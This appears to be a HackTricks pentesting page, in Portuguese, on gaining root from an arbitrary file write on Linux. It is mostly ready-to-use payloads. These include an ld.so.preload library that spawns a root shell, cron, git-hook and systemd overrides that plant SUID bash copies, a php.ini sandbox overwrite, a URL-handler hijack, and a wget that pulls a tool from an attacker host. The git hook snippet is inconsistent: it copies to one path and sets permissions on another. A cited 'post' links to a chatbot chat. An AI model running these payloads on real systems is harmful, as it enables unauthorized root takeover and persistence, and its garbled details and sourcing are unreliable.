# Gravação Arbitrária de Arquivo como root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Este arquivo se comporta como a variável de ambiente **`LD_PRELOAD`**, mas também funciona em **SUID binaries**.\
Se você puder criá-lo ou modificá-lo, pode simplesmente adicionar um **caminho para uma biblioteca que será carregada** com cada binário executado.

Por exemplo: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) são **scripts** que são **executados** em vários **eventos** em um repositório git como quando um commit é criado, um merge... Então, se um **script ou usuário privilegiado** estiver realizando essas ações com frequência e for possível **escrever na pasta `.git`**, isso pode ser usado para **privesc**.

Por exemplo, é possível **gerar um script** em um repositório git em **`.git/hooks`** para que ele seja sempre executado quando um novo commit for criado:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron & arquivos de agendamento

Se você conseguir **gravar arquivos relacionados ao cron que root executa**, normalmente poderá obter execução de código na próxima vez que a tarefa for executada. Alvos interessantes incluem:

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Crontab do root em `/var/spool/cron/` ou `/var/spool/cron/crontabs/`
- `systemd` timers e os serviços que eles acionam

Verificações rápidas:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Caminhos típicos de abuso:

- **Adicionar um novo root cron job** em `/etc/crontab` ou um arquivo em `/etc/cron.d/`
- **Substituir um script** já executado por `run-parts`
- **Backdoor um timer target existente** modificando o script ou binário que ele inicia

Exemplo mínimo de cron payload:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Se você só pode escrever dentro de um diretório de cron usado por `run-parts`, coloque um arquivo executável lá em vez disso:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Notas:

- `run-parts` geralmente ignora nomes de arquivo que contêm pontos, então prefira nomes como `backup` em vez de `backup.sh`.
- Algumas distros usam `anacron` ou timers `systemd` em vez do cron clássico, mas a ideia de abuso é a mesma: **modificar o que o root vai executar mais tarde**.

### Service & Socket files

Se você puder escrever **`systemd` unit files** ou arquivos referenciados por eles, pode ser capaz de obter execução de código como root recarregando e reiniciando a unidade, ou esperando que o caminho de ativação do serviço/socket seja acionado.

Alvos interessantes incluem:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Drop-in overrides in `/etc/systemd/system/<unit>.d/*.conf`
- Service scripts/binaries referenced by `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Writable `EnvironmentFile=` paths loaded by a root service

Verificações rápidas:
```bash
ls -la /etc/systemd/system /lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system 2>/dev/null
```
Vetores comuns de abuso:

- **Overwrite `ExecStart=`** em uma unidade de serviço de propriedade do root que você pode modificar
- **Add a drop-in override** com um `ExecStart=` malicioso e remover primeiro o anterior
- **Backdoor the script/binary** já referenciado pela unidade
- **Hijack a socket-activated service** modificando o arquivo `.service` correspondente que é iniciado quando o socket recebe uma conexão

Exemplo de override malicioso:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Fluxo típico de ativação:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Se você não pode reiniciar serviços por conta própria, mas pode editar uma unidade ativada por socket, pode ser necessário apenas **aguardar uma conexão de cliente** para acionar a execução do serviço com backdoor como root.

### Sobrescrever um `php.ini` restritivo usado por um sandbox PHP privilegiado

Alguns daemons customizados validam PHP fornecido pelo usuário executando `php` com um **`php.ini` restritivo** (por exemplo, `disable_functions=exec,system,...`). Se o código sandboxed ainda tem **qualquer write primitive** (como `file_put_contents`) e você pode alcançar o **caminho exato do `php.ini`** usado pelo daemon, você pode **sobrescrever essa configuração** para remover as restrições e então enviar um segundo payload que será executado com privilégios elevados.

Fluxo típico:

1. O primeiro payload sobrescreve a configuração do sandbox.
2. O segundo payload executa código agora que as funções perigosas foram reativadas.

Exemplo mínimo (substitua o caminho usado pelo daemon):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Se o daemon for executado como root (ou validar com caminhos de propriedade do root), a segunda execução gera um contexto root. Isso é essencialmente **privilege escalation via config overwrite** quando o runtime sandboxed ainda pode gravar arquivos.

### binfmt_misc

O arquivo localizado em `/proc/sys/fs/binfmt_misc` indica qual binário deve executar que tipo de arquivos. TODO: verificar os requisitos para abusar disso e executar uma rev shell quando um tipo de arquivo comum estiver aberto.

### Sobrescrever manipuladores de esquema (como http: ou https:)

Um atacante com permissões de escrita nos diretórios de configuração da vítima pode facilmente substituir ou criar arquivos que alteram o comportamento do sistema, resultando em execução de código não intencional. Ao modificar o arquivo `$HOME/.config/mimeapps.list` para apontar os manipuladores de URL HTTP e HTTPS para um arquivo malicioso (por exemplo, definindo `x-scheme-handler/http=evil.desktop`), o atacante garante que **clicar em qualquer link http ou https acione o código especificado naquele arquivo `evil.desktop`**. Por exemplo, depois de colocar o seguinte código malicioso em `evil.desktop` em `$HOME/.local/share/applications`, qualquer clique em URL externo executa o comando incorporado:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
Para mais informações, veja [**this post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49) onde foi usado para explorar uma vulnerabilidade real.

### Root executando scripts/binaries graváveis pelo usuário

Se um workflow privilegiado executa algo como `/bin/sh /home/username/.../script` (ou qualquer binary dentro de um diretório pertencente a um usuário não privilegiado), você pode assumir o controle dele:

- **Detect the execution:** monitore processos com [pspy](https://github.com/DominicBreuker/pspy) para capturar root invocando caminhos controlados pelo usuário:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Confirme permissões de escrita:** garanta que tanto o arquivo alvo quanto seu diretório sejam de propriedade e graváveis pelo seu usuário.
- **Assuma o controle do alvo:** faça backup do binário/script original e insira um payload que crie uma SUID shell (ou qualquer outra ação como root), então restaure as permissões:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Acione a ação privilegiada** (por exemplo, pressionando um botão da UI que inicia o helper). Quando root reexecutar o caminho sequestrado, capture a shell escalada com `./rootshell -p`.

## Referências

- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)

{{#include ../../banners/hacktricks-training.md}}
